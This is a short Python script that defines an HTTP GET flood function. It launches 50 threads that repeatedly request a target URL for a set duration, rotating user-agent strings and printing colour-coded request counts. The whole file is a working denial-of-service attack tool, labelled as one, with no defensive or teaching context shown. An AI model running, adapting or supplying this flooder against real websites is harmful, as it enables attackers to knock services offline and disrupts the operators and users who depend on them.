import threading
import random
import time
import requests
from colorama import Fore, Style

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Android 11; Mobile; rv:88.0)",
]

def http_flood(target_url, duration):
    timeout = time.time() + duration
    sent = 0

    def attack():
        nonlocal sent
        while time.time() < timeout:
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                }
                r = requests.get(target_url, headers=headers, timeout=5)
                sent += 1
                print(f"{Fore.BLUE}[HTTP] Request #{sent} sent — Status: {r.status_code} | URL: {target_url}{Style.RESET_ALL}")
            except requests.exceptions.RequestException:
                print(f"{Fore.RED}[HTTP] Request Failed{Style.RESET_ALL}")
                continue

    thread_count = 50
    threads = []

    print(f"\n{Fore.CYAN}[*] Starting HTTP GET Flood on {target_url} for {duration}s...{Style.RESET_ALL}")
    for _ in range(thread_count):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"{Fore.GREEN}[+] HTTP Flood Completed. Total requests: {sent}{Style.RESET_ALL}")
